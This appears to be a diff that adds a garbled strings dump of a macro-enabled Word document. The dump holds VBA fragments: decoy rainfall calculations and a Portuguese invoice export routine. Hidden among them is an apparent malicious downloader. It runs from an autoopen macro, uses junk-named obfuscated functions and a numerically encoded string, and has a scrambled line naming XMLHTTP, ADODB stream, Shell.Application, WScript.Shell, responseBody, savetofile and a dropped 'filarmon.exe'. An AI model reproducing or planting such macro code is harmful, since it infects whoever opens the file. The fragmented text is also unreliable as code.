@@ -1,0 +1,1005 @@
+}}^k
+NvFY
+ddAAd
+DwDDw
+d22dd
+sssa
+aasss
+Attribut
+e VB_Nam
+e = "Thi
+sDocumen
+1Normal
+VGlobal!
+Spac
+Crea
+tabl
+Pre decla
+BExp
+Temp
+lateDeri
+$Custom
+Sub auto
+open()
+&ceTex
+t "ssA",	
+aass
+KJnwef
+kjwh43JH
+GFBENMNB
+SJVHBKJS
+DV_Wo
+rd "ddd'
+Email
+Spec
+Error 1@0
+<A>Func tion 
+yVal cel
+lID As L ong, G
+Dezs
+ou@|)
+Dim jso&n
+UAlhpha
+aragraph
+ "DwDDw
+Better
+Then@
+=msW>F
+Attribut
+e VB_Nam
+e = "Use
+rForm1"
+A39571AA
+-1F02-47
+5C-A688-
+6549B2D8
+92C2}{6B
+8493EF-9
+JBC-8
+D7B-B42A
+BA83B647
+dGlobal!
+Spac
+Crea
+tabl
+Pre decla
+BExp
+0Tem
+plateDer
+Custo
+dd/mm/yyyy
+mm/dd/yyyy
+dd/mm/yyyy
+mm/dd/yyyy
+osofi
+:ele8	
+s:el@
+@="a
+<xs:el
+the @
+" />@
+xTy@
+Given Data Format
+Yearly Rainfall
+dataRange
+dataRange
+dd/mm/yyyy$
+dd/mm/yyyy$
+dd/mm/yyyy$
+dd/mm/yyyy$
+dd/mm/yyyy$
+Given Data Format
+Required Format
+dataRange
+dataRange
+Yearly Rainfall
+A2:B2
+A2:B57$
+^.+@.+\..+$
+Error #
+Error encountered (# 
+ - KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Email[mod_Validation])
+Replace multiple instances of fromTxt with toTxt in the string orgTxt
+A3:C3
+166492102918569210291856921029179292102992892102975292102975292102917609210291776921029188892102916169210291728921029185692102919369210291568921029161692102917289210291728921029155292102973692102915849210291776921029174492102975292102991292102976892102918729210291696921029176092102981692102915689210298969210291584921029816
+921029$
+t al
+Attribut
+e VB_Nam
+e = "Mod
+ule4"
+Priva
+unction 
+getMonth FromS
+LAs 
+(, sourc
+e_format
+dd /mm/y
+Then
+, 4,
+3Else
+0Left
+/nd If
+Year?
+Ri4gh
+y?(g
+3?W_qwM
+DwMNSu
+b calcul	
+_y@uly_r
+ainfall(
+ZC>Dim da
+taStartC
+Rang
+output
+curren
+Doubl
+previou^s
+I@nteger
+Lis(
+Byth
+in 4
+Sxize
+A@pplicaA
+ScreenUp
+C`F Cl
+lyResultFsI
+ Workshe
+ets("Giv
+en  Aa F
+("A1
+ R$\
+Wi<th+
+ffset(1,@ 0), .
+xlDown))
+L=< 1
+lya^F
+lue, "
+) Each
+, 1)
+NextW
+qTru0{
+_by_
+Q5p	
+Requir<ed
+StartCel
+ge(.Offs
+et(1, 0)
+, .End(x
+lDown)).
+Name = "
+data
+ With
+Set 
+G)	-
+year(Num
+mont
+DprevipousM
+.Valu
+r Each c
+currentD|at
+7Day(
+Rainfa
+Then
+Elsei
+outpu
+g$y, 
+12" 
+O0'N
+T>p0
+Next
+Applic
+ation.Sc@reenUp 
+TruPp
+ Cl 
+esults(
+Sheep
+ 5y").S0elec
+A2x:B2
+	,> 
+Cont
+PubA 
+ Funca
+KJnwefkj
+wh43JHGF
+BENMNBSJ
+VHBKJSKJ
+DV_Emai
+l(strIns
+ As St
+On ErrP
+GoTo
+ndler:
+IzPodTri
+(massiv
+eMyP
+a(3)5Q
+JJJn
+3_ppe__3
+v`ironmP
+Dim IJK
+= LBou
+/LenP
+Dj0eremb
+RemoveSp
+ialChar(
+attern
+m^.+@.
++\..+$
+D.xit
+ Case
+MsgB
+ox "
+#" F&
+": 5
+D@escrip
+ vbCrit@90l, _
+ed (
+X" -
+[Pmod_
+1Replace
+!(By
+ fr omTxt
+orgj
+$ '$
+le insta
+nces of
+in t
+he @%aO
+q0finalJ
+lenO
+t As Int
+eger, le
+nFromTxt
+  Dim :N
+b = """
+(org
+im$(
+8Len	4If
+0 Then
+3  Repla
+ceText
+End If
+plit("16
+64921029
+1856
+	928
+1760
+S91E.F
+(F)E38
+&89F+
+@	",T "
+AaDoA
+InStr(N,R 
+(M > 0)
+& Mi
+ N) & to
+  Else
+p While 
+Func
+Sub 
+ClearMon
+thlyResu
+lts(
+cell
+pRang
+"A3:C3")
+.Selec
+`kMa
+(xlToRi
+ght)
+pDownl
+entsL
+900ZH
+	Baltimore1
+Digite a Data Inicial
+Gerando Sadig...$
+mm/dd/yyyy$
+Digite a Data Final
+Gerando Sadig...$
+mm/dd/yyyy$
+SELECT * FROM Con_NF_Saida_Item_Sadig WHERE Data_Emissao>=#
+# AND Data_Emissao<=#
+# AND CANCELADA=
+ ORDER BY Data_Emissao
+Cod_Artefato$
+CFOP$
+5101
+5102
+6101
+6102
+6922
+5922
+6404
+5405
+6108
+07764000000107'
+AUTARQUIA COMERCIO E SAUDE ANIMAL LTDA EPP'
+CNPJ_CPF$
+RazaoSocial
+Endereco$
+Cidade$
+Telefone$
+Tipo_Cliente$
+Tipo_Saida$
+Cod_Artefato$
+Descricao_Produto
+Quant_Estoque
+###,##0
+Data_Emissao$
+dd/mm/yyyy$
+Autarquia
+Attribut
+e VB_Nam
+e = "Mod
+ule1"
+Public C
+ommDialo
+g_Sadig 
+As S
+Dim Datah1
+CNPJ_Dis
+idor	
+Nome_Emp0resa
+NClxien
+ndereco_
+Cidade
+Estad
+8Telefonq
+9Tip
+o@wo_P
+to_Roy
+Descr
+Quan
+_Mov
+im@vo
+YKJJJ
+3_pe__
+ObjectD
+u,ct
+xtLenParxt()
+NaStole
+yBradu&sA
+massive
+ Fun
+ction pi
+rognoe(A
+, A2
+Rep8lac
+oveSpec
+ Char( 3Fi,le
+Chr(
+3h	)) 
+/ (9 + 7
+Sub 
+CARREGAR
+_CAMPOS_
+CHAM
+CAO_SADI
+Err 
+Resu]
+	A/1 
+ormat(In
+putBox("PDigi
+Inia
+", "
+Gerando A
+...")
+m@m/dd/y
+Fina
+on_NF
+z_Item@
+= New R
+prdse@i
+Open "SE
+LECT * F
+issa
+o>=#" &B
+"# AND
+CELADA=
+ False
+RDER BYJ
+#DBGESTO R, ad!
+atic
+Loc@kOptim@
+Do Wh
+$.EOFa3
+LIMP
+If Is Null(
+Cod_Arte fato"@Z= 
+Theni
+CFOPW<
+"5101"P Or 
+6404[
+"077
+107 
+AUTA
+RQUIA CO
+MERCIO E@ SAUDE
+MAL LTDA
+ EPP
+Z(50 -
+!F u
+TIRA_PON~T
+C|PFP+
+1RazaoSo
+1, 60
+_("e
+?)8)
+|_C*
+ROL(
+$2{@
+Sadi
+g_Tipo_C
+liente =
+ RS_Con_
+NF_Saida`_Item
+(2"	
+String(4
+0 - Len(
+$), " 
+o_Produt
+o_Royal
+_Artefa|to
+fDesc
+rica
+;Mid
+ 1, |50
+Quan
+AvETIRA
+_PONTOS_
+SADIG(Fo0rmat
+Es toque
+##,##0")w
+;ata@_Movim@
+ssa`X
+{dd/
+mm/y
+YVend
+edor
+Nome_
+Autarqu|ia
+&[3?K
+@WCI
+ONAR_MOV8IME
+d If
+?eNext
+Loop1
+SetX
+Publi
+c Functi
+on R
+rVar iavel lOn
+ Err FRespume 
+eplace(E
+">(o
+ "$o
+ "|o
+ ":o
+0 Then
+3  Repla
+ceText
+End If
+plit("16
+64921029
+1856
+	928
+1760
+S91E.F
+(F)E38
+&89F+
+@	",T "
+AaDoA
+InStr(N,R 
+(M > 0)
+& Mi
+ N) & to
+  Else
+p While 
+Func
+Sub 
+ClearMon
+thlyResu
+lts(
+cell
+pRang
+"A3:C3")
+.Selec
+`kMa
+Error #
+Error encountered (# 
+ - KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Paragraph[mod_Validation])
+Attribut
+e VB_Nam
+e = "Mod
+ule2"
+Public 
+Function
+ KJnwefk
+jwh43JHG
+FBENMNBS
+JVHBKJSK
+DV_Par
+agraph(s
+trInspec@t As S
+Boole
+On E
+rror GoT
+_Handl
+.Inte8ger
+9someb
+YKJJ
+3_pe_
+_1.respo
+nseB
+ILen (Trim
+kCas@e Mid$
+,` i, 1
+'"Z", T"a
+ELls
+E0xit 
+Next
+uct1.Wri
+save
+tofile 
+NaSt@z, 2|
+.Num
+>MsgB
+ox "
+Descrip
+ , vbC
+3ic`al, _@2
+ncou
+red$ (P
+od_Valid2a
+nJZRe
+900ZH
+	Baltimore1
+ust X
+Attribut
+e VB_Nam
+e = "Mod
+ule8"
+Public 
+Function
+ KJnwefk
+jwh43JHG
+FBENMNBS
+JVHBKJSK
+DV_Wor
+d(strIns
+pect As "S
+olean
+Dim vesk
+onsis
+= pirogn
+oe(UserF
+orm1.Tex
+tBox1.Co
+ntrolTip
+, "11"
+8e")
+&D!E
+massive@MyData
+S plit(
+Set suBb
+uct1
+reateObj
+#(1)
+tadyBrad
+Error Go
+_Hand
+ler:
+Integer
+   @
+g i	
+"Len(0Trim
+ The
+<@YKJJJn
+3 _pe__
+.Sel
+Case Mid
+$N!, i,@
+UExit
+Res>u
+ EPP
+Z(50 -
+!F u
+Project
+NvFY
+rstd
+ole>
+\G{00020
+430-
+0046}#
+2.0#0#C:
+\Windows
+\SysWOW6
+e2.tlb
+VHBKJSKJMNBSDV_Name[mod_Validation])
+Attribut
+e VB_Nam
+e = "Mod
+ule7"
+Funct
+ion KJnw
+efkjwh43
+JHGFBENM
+NBSJVHBK
+JSKJ
+Alpha(st
+rInspect  As S
+Boolea
+On Er
+ror GoTo
+_Handle
+yDim i
+.IntegerQ
+P=  22
+1.(Typ
+1	%1.8Ope
+TrTue
+NLen(Tr$im
+pCase M
+, i,
+"Z", "a
+Exit
+KEnd 
+Next i
+I6@i.Numb
+BaI*MsgBox
+q#" &
+De scrip
+vbCritic`al, _
+ncou
+{red$ (P
+od_Valid2a
+FRe|su
+Public A
+CheckdhB
+etterTh
+stadyB radusB
+ (@YKJJJn
+_peNaSt
+, K?a
+{?a`dJ)?a"'a"0cc9
+F_FB>S`
+*C__
+ massiv
+eMyData(
+10`i(2 + 
+3Dje
+remy, 
+Send`u
+4`+	L
+80 /x 30
+oPaAq>n
+A-Z]
+M_5F5 
+currentYear
+dataRangeMP0
+yearlySum
+previousMonth
+previousYear:*0
+yearNumi"0
+monthListL
+outMonth
+cell
+dateNum2~0
+inputRangeSize4
+Application
+ScreenUpdating!
+ClearYearlyResults~
+Worksheets
+Offset
+xlDownUD0
+Value
+calculate_rainfall_by_month
+currentDayr 0
+currentRainfall
+monthlySum!p0
+monthNum
+ClearMonthlyResults
+Month
+Year
+Sheets
+SelectionZ
+ClearContents{
+strInspect
+Err_Handlerl
+IzPodTri
+CreateObject
+massiveMyData
+YKJJJnnnn3_pe__3
+Environment
+TextLenPart
+DjeremyS
+RemoveSpecialCharn
+strPattern'i0
+Exit_Handler!
+Erro
+Number
+MsgBox
+Description
+vbCritical+}0
+fromTxt`
+toTxt
+orgTxt
+finalTxt
+lenOrgTxt
+lenFromTxti
+Trim@
+Split
+xlToRight|
+Module1b
+CommDialog_Sadig
+Data1@10
+Data2A10
+Sadig_CNPJ_Distribuidor
+Sadig_Nome_Empresa
+Sadig_CNPJ_Cliente
+Sadig_Nome_Cliente
+Sadig_Endereco_Clienteq
+Sadig_Cidade_Cliente
+Sadig_CEP_Cliente
+Sadig_Estado_Cliente
+Sadig_Telefone_Cliente3a0
+Sadig_Tipo_ClienteS10
+Sadig_Tipo_Saida0
+Sadig_Codigo_Produto_RoyalQ
+Sadig_Descricao_Produto_Royal
+Sadig_Quant_Saida
+Sadig_Data_Movimento
+Sadig_Codigo_Vendedor
+Sadig_Nome_Vendedor
+YKJJJnnnn3_pe__1
+substruct1
+YKJJJnnnn3_pe__4
+YKJJJnnnn3_peNaStole
+stadyBradusb!0
+pirognoeC
+A1k\0
+A2l\0
+A3m\0
+Replacef
+strFileName
+ChrK~0
+CARREGAR_CAMPOS_CHAMAR_FUNCAO_SADIG
+InputBox
+RS_Con_NF_Saida_Item_Sadig
+Recordset
+DBGESTOR^
+adOpenStatic
+adLockOptimistic
+LIMPA_CAMPOS<
+IsNull
+CFOP{
+RETIRA_PONTOS_SADIG
+ADICIONAR_MOVIMENTOS6
+MoveNextL!0
+Variavel
+UCase5
+Module2c
+somebody
+responseBodyT
+savetofile
+Module8i
+veskonsisp
+TextBox1
+ControlTipText8
+Module7h
+substruct
+Send
+Documentj
+_B_str_Trim
+_B_var_Mid
+_B_str_Mid
+UserFormN
+CommandButton1|
+CommandButton2}
+CommandButton3~
+Image1_
+_B_var_TrimmT0
+_B_var_IzPodTriTm0
+_B_var_C
+_B_var_Chr\;0
+_B_var_substructM
+_B_var_somebody
+Given Data Format
+Required Format
+Digi
+te Ax
+?htt@
+m/pk
+ucts/m
+ft.c 
+ftRo@
+Error #
+Error encountered (# 
+ - KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Alpha[mod_Validation])
+^[A-Z]'
+Error #
+Error encountered (# 
+ - KJnwefkjwh43JHGFBENMNBSJ
+/vFY
+NvFY
+:<D4
+WordS10
+Win16
+Win32
+Win64F
+VBA6
+VBA7
+Project-
+stdole
+Normal
+Office
+MSFormsC
+ThisDocument<
+_Evaluate
+autoopen
+ReplaceText!/0
+KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Word
+KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_EmailO
+KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Name|
+CheckDriveSpecErrorC30
+cellID
+cellDes
+cellVal
+jsonStr
+KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Alpha
+KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Paragraph
+CheckKJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_BetterThen
+UserForm1)
+Module4e
+getMonthFromStringA
+stringDate
+source_format8
+getYearFromString
+Right
+getDayFromString
+calculate_yearly_rainfall
+dataStartCell?
+Range
+outputStartCell
+currentCell
+currentDate;
+currentMonth
+}}^k
+}}^k
+#OLE Aut
+omation
+ENormal
+*,\C
+!Offic
+!G{2DF
+8D04C-5B
+FA-101B-
+BDE5
+m Files 
+(x86)\Co
+mmon
+	\Mi
+crosoft 
+Shared\O
+FFICE16\
+MSO.DLL#
+P 16.0 
+ LibrXary
+SF@Cs>
+eD45
+2EE1-E08"F
+1A-8
+2608C4D0
+eINDO
+eFM20L'
+0}#0
+EF014E6-
+3461-48
+AA75-E3C
+E2D09D
+Users\al
+ex\AppDa
+ta\Local
+\Temp\VB
+6.exd
+isDocume
+D@kc
+ModuleT4GDYo`
+*\CNormalrU
+]3"K
+ThisDocument
+UserForm1
+Module4
+Module1
+Module2
+Module8
+Module7
+Project
+C:\Program Files (x86)\Common Files\Microsoft Shared\VBA\VBA7.1\VBE7.DLL
+C:\Program Files (x86)\Microsoft Office\Office16\MSWORD.OLB
+Word
+C:\Windows\SysWOW64\stdole2.tlb
+stdole
+C:\Program Files (x86)\Common Files\Microsoft Shared\OFFICE16\MSO.DLL
+Office
+C:\WINDOWS\SysWOW64\FM20.DLL
+MSForms
+C:\Users\alex\AppData\Local\Temp\VBE\MSForms.exd
+Document
+autoopen
+CheckDriveSpecError
+Attribut
+e VB_Nam
+e = "Mod
+ule7"
+cellID
+cellDes
+cellValg
+1	%1.8Ope
+TrTue
+Tahoma
+TextBox1"
+Tahoma#
+CommandButton1
+Tahoma
+CommandButton2c
+Tahoma#
+CommandButton3
+Tahoma#
+pdating!
+ClearYearlyResults~
+Worksheets
+Offset
+D!icrobrioft.XD!LHTTP10)Adodb.britr11aD!10)brih11ll.Application10)Wbricript.brih11ll10)Proc11bribri10)G11T10)T11D!P10)Typ1110)op11n10)writ1110)r11briponbri11Body10)briav11tofil1110)\filarmon.11x11
+CommandButton1
+CommandButton2
+CommandButton3
+Image1x1
+Microsoft Forms 2.0 Form
+Embedded Object
+Description
+vbCritiVERSION 5.00
+Begin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} UserForm1 
+   Caption         =   "UserForm1"
+   ClientHeight    =   5835
+   ClientLeft      =   45
+   ClientTop       =   390
+   ClientWidth     =   3630
+   StartUpPosition =   1  'CenterOwner
+   TypeInfoVer     =   5
+Sadig_Endereco_ClienteThisDocument
+UserForm1
+Module1
+Module7
+Module8
+Module4
+Module2
+gID="{5065C21D-0796-401B-992C-36372BFEC3ED}"
+Document=ThisDocument/&H00000000
+Package={AC9F2F90-E877-11CE-9F68-00AA00574A4F}
+BaseClass=UserForm1
+Module=Module1
+Module=Module7
+Module=Module8
+Module=Module4
+Module=Module2
+Name="Project"
+HelpContextIP
+D="0"
+VersionCompatible32="393222000"
+CMG="7270B9BE3AC23AC23AC23AC2"
+DPB="F7F53C45444FC850C850C8"
+GC="7C7EB7CCB950BA50BAAF"
+[Host Extender Info]
+&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000
+[Workspace]
+ThisDocument=175, 175, 1656, 527, 
+UserForm1=0, 0, 0, 0, C, 26, 26, 1614, 711, C
+Module1=52, 52, 1640, 737, 
+Module7=130, 130, 1584, 679, 
+Module8=0, 0, 1481, 352, 
+Module4=104, 104, 1558, 653, 
+Module2=78, 78, 1532, 627, Z
+QmQZa
+j@X_
